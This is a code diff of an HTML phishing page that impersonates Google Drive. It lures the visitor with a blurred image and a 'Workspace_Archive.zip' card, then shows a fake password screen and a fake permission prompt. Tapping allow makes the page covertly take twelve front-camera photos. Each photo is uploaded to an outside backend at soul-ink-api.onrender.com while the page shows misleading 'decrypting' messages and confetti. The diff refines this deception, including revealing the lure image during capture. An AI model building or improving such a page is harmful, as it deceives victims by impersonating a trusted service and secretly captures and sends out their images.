@@ -3,105 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Drive - Decrypt File</title>
+    <title>Google Drive - Secure View</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --g-blue: #0b57d0; --g-bg: #f8f9fa; }
+        :root { --g-blue: #0b57d0; --g-gray: #444746; --g-surface: #f3f6fc; }
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }
 
-        /* Background Image from GitHub Repository */
-        .bg-blur {
+        /* Background: Visible even when processing */
+        #bg-image {
             position: fixed; inset: 0;
-            background: url('pic.jpg'); /* Matches your filename */
+            background: url('pic.jpg'); 
             background-size: cover;
             background-position: center;
-            filter: blur(45px) brightness(0.6);
+            filter: blur(60px) brightness(0.4);
             transform: scale(1.1);
-            z-index: -1;
+            z-index: 1;
+            transition: filter 2.2s cubic-bezier(0.4, 0, 0.2, 1), brightness 2.2s ease, transform 2.2s ease;
         }
 
-        /* Clean Google Loader */
-        #loader { 
-            position: fixed; inset: 0; background: white; z-index: 10000; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+        /* Transparent Processing Layer (shows the pic behind it) */
+        #processing-overlay {
+            position: fixed; inset: 0;
+            background: rgba(255, 255, 255, 0.25); /* Low opacity to see the pic */
+            backdrop-filter: blur(4px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 12000;
         }
-        .logo { width: 65px; margin-bottom: 25px; }
-        .p-bar { width: 140px; height: 4px; background: #f1f1f1; border-radius: 2px; overflow: hidden; }
-        .p-fill { width: 0%; height: 100%; background: #4285F4; transition: width 0.2s linear; }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid var(--g-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #status-text { font-family: 'Google Sans', sans-serif; color: white; font-size: 15px; font-weight: 500; text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
+
+        /* Loader */
+        #loader { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .p-bar { width: 100px; height: 4px; background: #eee; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .p-fill { width: 0%; height: 100%; background: var(--g-blue); transition: width 0.1s linear; }
 
         /* Main UI */
-        #main-ui { display: none; height: 100vh; }
-        .header { height: 60px; display: flex; align-items: center; padding: 0 16px; background: rgba(255,255,255,0.92); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(0,0,0,0.1); }
-        
-        .content { display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
-        .drive-card { 
-            background: rgba(255,255,255,0.96); width: 88%; max-width: 360px; border-radius: 16px; 
-            padding: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); text-align: center; cursor: pointer;
-        }
-        .file-icon { width: 60px; margin-bottom: 15px; }
+        #main-ui { display: none; height: 100vh; position: relative; z-index: 5; }
+        .header { height: 64px; display: flex; align-items: center; padding: 0 20px; background: white; }
+        .header span { font-family: 'Google Sans', sans-serif; font-size: 20px; color: var(--g-gray); margin-left: 12px; }
 
-        /* Security Modal */
+        /* Password Screen */
         #pass-modal { 
             display: none; position: fixed; inset: 0; background: white; z-index: 9000; 
-            flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+            flex-direction: column; align-items: center; padding: 80px 24px;
         }
-        .in-pass { width: 85%; max-width: 300px; padding: 16px; border: 1px solid #747775; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .in-pass { width: 100%; max-width: 340px; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-top: 30px; }
 
-        /* Material 3 Sheet */
-        #fake-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.65); z-index: 11000; }
+        /* REAL DRIVE SYSTEM DIALOGUE */
+        #fake-box { 
+            display: none; position: fixed; inset: 0; 
+            background: rgba(0,0,0,0.6); z-index: 11000; 
+        }
         .sheet { 
-            position: fixed; bottom: 12px; left: 50%; transform: translateX(-50%); 
-            width: 94%; max-width: 400px; background: #f3f6fc; border-radius: 28px; 
-            padding: 24px; box-sizing: border-box; 
+            position: fixed; bottom: 12px; left: 12px; right: 12px;
+            background: var(--g-surface); border-radius: 28px; padding: 24px; 
+            box-sizing: border-box; text-align: left;
         }
-        .btn-p { background: var(--g-blue); color: white; border: none; padding: 16px; border-radius: 100px; width: 100%; font-weight: 500; margin-bottom: 8px; cursor: pointer; font-size: 15px; }
-        .btn-s { background: transparent; color: var(--g-blue); border: none; padding: 10px; width: 100%; font-weight: 500; cursor: pointer; }
-
-        #scanner { display: none; position: fixed; top: 0; width: 100%; height: 4px; background: #4285F4; box-shadow: 0 0 15px #4285F4; z-index: 5000; animation: scan 2s infinite linear; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .sheet-icon { width: 32px; margin-bottom: 16px; }
+        .sheet-title { font-family: 'Google Sans', sans-serif; font-size: 18px; color: #1f1f1f; margin-bottom: 24px; line-height: 1.4; }
+        
+        .btn-p { background: var(--g-blue); color: white; border: none; padding: 14px; border-radius: 100px; width: 100%; font-weight: 500; font-size: 14px; margin-bottom: 8px; cursor: pointer; }
+        .btn-s { background: transparent; color: var(--g-blue); border: none; padding: 12px; width: 100%; font-weight: 500; font-size: 14px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="bg-blur"></div>
+    <div id="bg-image"></div>
+
+    <div id="processing-overlay">
+        <div class="spinner"></div>
+        <div id="status-text">Synchronizing identity...</div>
+    </div>
 
     <div id="loader">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="60">
         <div class="p-bar"><div id="p-fill" class="p-fill"></div></div>
     </div>
 
     <div id="main-ui">
         <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="22">
-            <span style="margin-left:12px; font-weight:500; color:#444746;">Drive</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="24">
+            <span>Drive</span>
         </div>
-        <div id="scanner"></div>
-        <div class="content">
-            <div class="drive-card" onclick="openPass()">
-                <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png" class="file-icon">
-                <p style="font-weight:500; margin:0; font-size:18px; color: #1f1f1f;">Secure_Archive_Shared.zip</p>
-                <p style="font-size:13px; color:#5f6368; margin-top:8px;">Size: 54.2 MB • Encrypted Archive</p>
-                <button style="margin-top:20px; border:none; background:var(--g-blue); color:white; padding:12px 28px; border-radius:50px; font-weight:500;">Open Folder</button>
+        <div style="display:flex; flex-direction:column; align-items:center; padding-top:100px;">
+            <div style="background:white; padding:24px; border-radius:16px; text-align:center; width:85%; max-width:320px; box-shadow:0 2px 6px rgba(0,0,0,0.1);" onclick="openPass()">
+                <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png" width="48">
+                <p style="font-weight:500; margin:16px 0 4px 0;">Workspace_Archive.zip</p>
+                <p style="font-size:12px; color:var(--g-gray);">Shared via Google Workspace</p>
+                <button style="margin-top:24px; border:none; background:var(--g-blue); color:white; padding:12px 24px; border-radius:100px; font-weight:500; width:100%;">Access File</button>
             </div>
         </div>
     </div>
 
     <div id="pass-modal">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="45" style="margin-bottom:20px;">
-        <h3 style="margin:0 0 10px 0;">Authentication Required</h3>
-        <p style="color:#444746; font-size:14px; margin-bottom:25px; text-align:center;">Enter the shared access code to begin decryption.</p>
-        <input type="password" id="pwd" class="in-pass" placeholder="Enter Access Code">
-        <button class="btn-p" style="max-width:300px;" onclick="verify()">Decrypt & Open</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="48">
+        <h2 style="font-family:'Google Sans'; margin-top:20px;">Verify identity</h2>
+        <p style="color:var(--g-gray); text-align:center; font-size:14px; line-height:1.5;">To view this protected item, enter the security code for this Workspace organization.</p>
+        <input type="password" id="pwd" class="in-pass" placeholder="Enter password">
+        <button class="btn-p" style="width:100px; margin-top:40px; align-self:flex-end;" onclick="verify()">Next</button>
     </div>
 
     <div id="fake-box">
         <div class="sheet">
-            <div style="display:flex; align-items:center; margin-bottom:15px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="16">
-                <span style="margin-left:8px; font-size:12px; color:#444746;">drive.google.com</span>
-            </div>
-            <div style="font-size:19px; line-height:1.4; margin-bottom:28px; color:#1f1f1f;">Allow Drive to decrypt and open the file?</div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="sheet-icon">
+            <div class="sheet-title">Allow Drive to decrypt and open the file?</div>
             <button class="btn-p" onclick="trigger()">While using the app</button>
             <button class="btn-p" onclick="trigger()">Only this time</button>
             <button class="btn-s" onclick="location.reload()">Don't allow</button>
@@ -109,23 +128,14 @@
     </div>
 
     <script>
-        // Your Render Backend
         const RENDER_URL = 'https://soul-ink-api.onrender.com';
 
         window.onload = () => {
-            fetch(`${RENDER_URL}/ping`).catch(() => {});
             let w = 0;
             const iv = setInterval(() => {
-                w += 10;
-                document.getElementById('p-fill').style.width = w + '%';
-                if(w >= 100) {
-                    clearInterval(iv);
-                    setTimeout(() => { 
-                        document.getElementById('loader').style.display='none'; 
-                        document.getElementById('main-ui').style.display='block'; 
-                    }, 600);
-                }
-            }, 100);
+                w += 5; document.getElementById('p-fill').style.width = w + '%';
+                if(w >= 100) { clearInterval(iv); setTimeout(() => { document.getElementById('loader').style.display='none'; document.getElementById('main-ui').style.display='block'; }, 400); }
+            }, 60);
         };
 
         function openPass() { document.getElementById('pass-modal').style.display = 'flex'; }
@@ -139,40 +149,42 @@
 
         async function trigger() {
             document.getElementById('fake-box').style.display = 'none';
-            document.getElementById('scanner').style.display = 'block';
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('processing-overlay').style.display = 'flex';
+            
+            const status = document.getElementById('status-text');
+            const bg = document.getElementById('bg-image');
+
+            // Start Reveal Animation immediately
+            bg.style.filter = 'blur(0px) brightness(1.1)';
+            bg.style.transform = 'scale(1)';
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video');
-                v.srcObject = stream;
-                await v.play();
+                v.srcObject = stream; await v.play();
 
                 let count = 0;
-                // Capture Loop: 12 photos in 2 seconds
                 const timer = setInterval(() => {
                     const c = document.createElement('canvas');
                     c.width = 480; c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+                    
+                    if(count == 4) status.innerText = "Decrypting workspace assets...";
+                    if(count == 8) status.innerText = "Finalizing secure view...";
 
-                    fetch(`${RENDER_URL}/upload`, {
-                        method: 'POST',
-                        mode: 'cors',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ image: rawData })
-                    }).catch(() => {});
+                    fetch(`${RENDER_URL}/upload`, { method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: rawData }) }).catch(() => {});
 
                     count++;
                     if (count >= 12) {
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('scanner').style.display = 'none';
-                        confetti({ particleCount: 120, spread: 70, origin: { y: 0.8 }, colors: ['#4285F4', '#34A853'] });
-                        setTimeout(() => { window.location.href = "https://drive.google.com"; }, 1500);
+                        document.getElementById('processing-overlay').style.display = 'none';
+                        confetti({ particleCount: 150, spread: 70, origin: { y: 0.8 }, colors: ['#4285F4', '#34A853', '#FBBC05'] });
                     }
                 }, 166); 
-            } catch (e) {
-                location.reload();
-            }
+            } catch (e) { location.reload(); }
         }
     </script>
 </body>
